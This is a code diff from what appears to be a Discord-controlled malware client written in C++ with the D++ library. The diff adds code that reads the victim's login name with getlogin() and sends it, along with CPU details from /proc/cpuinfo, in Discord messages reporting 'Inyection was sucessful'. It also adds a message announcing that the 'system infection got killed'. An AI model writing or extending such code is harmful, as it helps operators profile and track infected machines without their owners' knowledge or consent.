@@ -7,12 +7,13 @@ struct list_error {
 struct system_specs {
     std::string cpu_model;
     std::string cpu_cores;
+    std::string name;
 };
 
 list_error handled_err;
 system_specs hardware_specs;
 
-dpp::embed making_connection(std::string& username) {
+dpp::embed making_connection() {
     std::ifstream cpu_model("/proc/cpuinfo");
     std::string line_cpu;
 
@@ -59,7 +60,9 @@ dpp::embed connection_result(bool& result) {;
     } else {
         std::string result_success = "```Inyection was sucessful.```";
         std::string output_success = "```No errors.```";
-        std::string sys_about = "```CPU: " + hardware_specs.cpu_model + " || " + hardware_specs.cpu_cores + " cores.\nGPU: ```";
+        char* system_username = getlogin();
+        hardware_specs.name = std::string(system_username);
+        std::string sys_about = "```User: " + hardware_specs.name + "\nCPU: " + hardware_specs.cpu_model + " || " + hardware_specs.cpu_cores + " cores.\nGPU: ```";
 
         dpp::embed success = dpp::embed()
             .set_color(dpp::colors::green)
@@ -80,6 +83,18 @@ dpp::embed handle_catch(const std::exception& e) {
     std::string formated_exception = "```" + excp + "```";
     dpp::embed success = dpp::embed()
         .set_color(dpp::colors::green)
+        .add_field("<:websit:1140446138177179860> Status", status_error, true)
+        .add_field("<:blueshie:1127620004955836416> Output", formated_exception, true)
+        ;
+
+        return success;
+}
+
+dpp::embed handle_kill() {
+    std::string status_error = "```Terminated.```";
+    std::string formated_exception = "```The " + hardware_specs.name + " system infection got killed by the systen.```";
+    dpp::embed success = dpp::embed()
+        .set_color(dpp::colors::red)
         .add_field("<:websit:1140446138177179860> Status", status_error, true)
         .add_field("<:blueshie:1127620004955836416> Output", formated_exception, true)
         ;
